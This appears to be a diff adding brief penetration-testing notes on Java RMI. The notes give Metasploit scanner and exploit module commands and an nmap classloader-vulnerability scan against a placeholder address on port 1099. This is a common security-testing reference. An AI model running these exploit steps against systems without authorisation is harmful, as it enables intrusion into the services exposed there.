@@ -1,1 +1,17 @@
-use exploit/multi/misc/java_rmi_server
+# Pentesting Java RMI
+
+
+# Enumeration (metasploit)
+;; Reference: https://hak5.org/episodes/metasploit-minute/exploitation-using-java-rmi-service-metasploit-minute
+msf > use auxiliary/scanner/misc/java_rmi_server
+msf > run
+
+
+# Exploit (metasploit)
+msf > use exploit/multi/misc/java_rmi_server
+msf > run
+
+# Enumeration (nmap)
+nmap --script=rmi-vuln-classloader -p 1099 192.168.xx.xx
+
+
